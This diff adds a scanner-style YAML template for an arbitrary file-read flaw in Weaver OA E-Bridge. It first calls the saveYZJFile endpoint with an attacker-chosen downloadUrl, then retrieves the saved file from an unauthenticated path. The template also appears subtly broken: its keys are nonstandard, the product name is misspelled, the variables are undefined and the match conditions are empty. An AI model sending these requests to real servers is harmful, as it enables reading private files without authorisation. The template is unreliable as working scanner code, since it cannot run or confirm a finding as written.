@@ -1,0 +1,23 @@
+id: weaver-ebridge-lfi
+brief:
+    title: Weaver E-Bidge saveYZJFile - Local File Read
+    by: SleepingBag945
+    level: high
+    about: There is an arbitrary file reading vulnerability in the Weaver OA E-Bridge saveYZJFile interface. An attacker can read any file on the server through the vulnerability.
+    label:
+        - eBridge
+        - weaver
+        - oa
+        - lfi
+        - lfr
+        - intrusive
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wxjsapi/saveYZJFile?fileName=test&downloadUrl={{path}}'
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/file/fileNoLogin/{{idname}}'
+      signs: []
